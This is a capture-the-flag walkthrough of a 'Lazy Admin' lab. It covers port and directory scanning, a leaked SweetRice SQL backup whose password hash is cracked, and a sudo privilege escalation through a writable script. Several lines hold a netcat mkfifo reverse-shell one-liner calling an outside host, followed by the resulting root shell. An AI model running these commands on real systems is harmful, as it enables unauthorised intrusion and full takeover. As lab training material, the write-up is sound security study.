@@ -1,0 +1,205 @@
+Lazy Admin
+
+https://jc01.ninja/ctf/lazy-admin/
+
+a ninja J write up!!!!
+
+
+┌──(kali㉿kali)-[~]
+└─$ nmap 10.10.226.112
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-08 13:38 EDT
+Nmap scan report for 10.10.226.112
+Host is up (0.10s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 7.65 seconds
+  
+  
+┌──(kali㉿kali)-[~]
+└─$ dirsearch -u 10.10.226.107                                                                                                                                       1 ⨯
+
+  _|. _ _  _  _  _ _|_    v0.4.1
+ (_||| _) (/_(_|| (_| )
+
+Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10877
+
+Output File: /home/kali/.dirsearch/reports/10.10.226.107/_21-06-09_19-43-47.txt
+
+Error Log: /home/kali/.dirsearch/logs/errors-21-06-09_19-43-47.log
+
+Target: http://10.10.226.107/
+
+[19:43:49] Starting: 
+[19:43:57] 403 -  278B  - /.ht_wsr.txt
+[19:43:57] 403 -  278B  - /.htaccess.bak1
+[19:43:57] 403 -  278B  - /.htaccess.sample
+[19:43:57] 403 -  278B  - /.htaccess.save
+[19:43:57] 403 -  278B  - /.htaccess_extra
+[19:43:57] 403 -  278B  - /.htaccess_orig
+[19:43:57] 403 -  278B  - /.htm
+[19:43:57] 403 -  278B  - /.htaccess.orig
+[19:43:57] 403 -  278B  - /.htaccessOLD
+[19:43:57] 403 -  278B  - /.htaccessBAK
+[19:43:57] 403 -  278B  - /.htaccess_sc
+[19:43:57] 403 -  278B  - /.htaccessOLD2
+[19:43:57] 403 -  278B  - /.htpasswds
+[19:43:57] 403 -  278B  - /.htpasswd_test
+[19:43:57] 403 -  278B  - /.html
+[19:43:57] 403 -  278B  - /.httr-oauth
+[19:43:59] 403 -  278B  - /.php
+[19:43:59] 403 -  278B  - /.php3
+[19:44:33] 301 -  316B  - /content  ->  http://10.10.226.107/content/
+[19:44:34] 200 -    2KB - /content/
+[19:44:42] 200 -   11KB - /index.html
+[19:44:57] 403 -  278B  - /server-status
+[19:44:57] 403 -  278B  - /server-status/
+
+Task Completed
+                                                                                                                                                                         
+┌──(kali㉿kali)-[~]
+└─$ dirsearch -u 10.10.226.107/content
+
+  _|. _ _  _  _  _ _|_    v0.4.1
+ (_||| _) (/_(_|| (_| )
+
+Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10877
+
+Output File: /home/kali/.dirsearch/reports/10.10.226.107/content_21-06-09_19-47-28.txt
+
+Error Log: /home/kali/.dirsearch/logs/errors-21-06-09_19-47-28.log
+
+Target: http://10.10.226.107/content/
+
+[19:47:28] Starting: 
+[19:47:31] 301 -  319B  - /content/js  ->  http://10.10.226.107/content/js/
+[19:47:34] 403 -  278B  - /content/.ht_wsr.txt
+[19:47:34] 403 -  278B  - /content/.htaccess.orig
+[19:47:34] 403 -  278B  - /content/.htaccess.bak1
+[19:47:34] 403 -  278B  - /content/.htaccess.sample
+[19:47:34] 403 -  278B  - /content/.htaccess_orig
+[19:47:34] 403 -  278B  - /content/.htaccess_extra
+[19:47:34] 403 -  278B  - /content/.htaccess.save
+[19:47:34] 403 -  278B  - /content/.htaccessOLD
+[19:47:34] 403 -  278B  - /content/.htaccess_sc
+[19:47:34] 403 -  278B  - /content/.htaccessOLD2
+[19:47:34] 403 -  278B  - /content/.htm
+[19:47:34] 403 -  278B  - /content/.htaccessBAK
+[19:47:34] 403 -  278B  - /content/.html
+[19:47:34] 403 -  278B  - /content/.htpasswd_test
+[19:47:34] 403 -  278B  - /content/.htpasswds
+[19:47:34] 403 -  278B  - /content/.httr-oauth
+[19:47:35] 403 -  278B  - /content/.php
+[19:47:36] 403 -  278B  - /content/.php3
+[19:47:46] 200 -  964B  - /content/_themes/
+[19:48:09] 200 -   18KB - /content/changelog.txt
+[19:48:20] 200 -    3KB - /content/images/
+[19:48:20] 301 -  323B  - /content/images  ->  http://10.10.226.107/content/images/
+[19:48:20] 301 -  320B  - /content/inc  ->  http://10.10.226.107/content/inc/
+[19:48:20] 200 -    7KB - /content/inc/
+[19:48:20] 200 -    2KB - /content/index.php
+[19:48:20] 200 -    2KB - /content/index.php/login/
+[19:48:22] 200 -    2KB - /content/js/
+[19:48:23] 200 -   15KB - /content/license.txt
+
+Task Completed
+
+so in the inc directory there was a sql back up
+
+ => 'INSERT INTO `%--%_options` VALUES(\'1\',\'global_setting\',\'a:17:{
+s:4:\\"name\\";
+s:25:\\"Lazy Admin'
+s Website\\";
+s:6:\\"author\\";
+s:10:\\"Lazy Admin\\";
+s:5:\\"title\\";
+s:0:\\"\\";
+s:8:\\"keywords\\";
+s:8:\\"Keywords\\";
+s:11:\\"description\\";
+s:11:\\"Description\\";
+s:5:\\"admin\\";
+s:7:\\"manager\\";
+s:6:\\"passwd\\";
+s:32:\\"42f749ade7f9e195bf475f37a44cafcb\\";
+s:5:\\"close\\";
+i:1;
+s:9:\\"close_tip\\";
+s:454:\\"<p>Welcome to SweetRice - Thank your for install SweetRice as your website management system.</p>
+<h1>This site is building now , please come late.</h1>
+<p>If you are the webmaster,please go to Dashboard -> General -> Website setting </p>
+<p>and uncheck the checkbox \\"Site close\\" to open your website.</p>
+<p>More help at <a href=\\"http://www.basic-cms.org/docs/5-things-need-to-be-done-when-SweetRice-installed/\\">Tip for Basic CMS SweetRice installed</a></p>\\";
+s:5:\\"cache\\";
+i:0;
+s:13:\\"cache_expired\\";
+i:0;
+s:10:\\"user_track\\";
+i:0;
+s:11:\\"url_rewrite\\";
+i:0;
+s:4:\\"logo\\";
+s:0:\\"\\";
+s:5:\\"t
+
+
+md5	Password123
+
+manager:Password123
+
+we get a cms sweet rice creat an ad and put our php reverse in that, 
+
+to quote master ninjaJ
+
+Privelage Escalation
+
+One of the easiest ways to find potential privelage escalation methods is sudo -l. Normally, as www-data you wouldn't be able to run any commands as root using sudo, but it looks like this developer has been extra lazy!
+
+$ sudo -l
+Matching Defaults entries for www-data on THM-Chal:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on THM-Chal:
+    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl                
+        
+
+A perl script, that we can run as root. This is pretty interesting, but we don't have write permissions for this script so we can't change it's behaviour. The script is very short, and only has 1 line of code.
+
+#!/usr/bin/perl
+
+system("sh", "/etc/copy.sh");
+
+This one line of code runs another script, located in /etc/.
+
+$ cd /etc/
+$ ls -lah | grep copy.sh
+-rw-r--rwx   1 root root     81 Nov 29 13:45 copy.sh
+                
+
+We had write permissions for this file, and we can run it at root. All we need now is to insert a reverse shell, and as luck would have it there's already one in the file so we just need to edit the IP address and port
+
+
+$ cd /etc/
+$ ls -lah | grep copy.sh
+-rw-r--rwx   1 root root     81 Nov 29 13:45 copy.sh
+$ cat copy.sh	
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f
+$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.x.x.x 4445 >/tmp/f" > copy.sh
+$ sudo /usr/bin/perl /home/itguy/backup.pl
+root@ninja:~# nc -lvnp 4445
+listening on [any] 4445 ...
+connect to [10.x.x.x] from (UNKNOWN) [10.10.185.14] 57022
+/bin/sh: 0: can't access tty; job control turned off
+# whoami
+root
+# cd /root && ls
+root.txt
+# cat root.txt
+            
+
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.6.65.43 5554 >/tmp/f
+
+
+
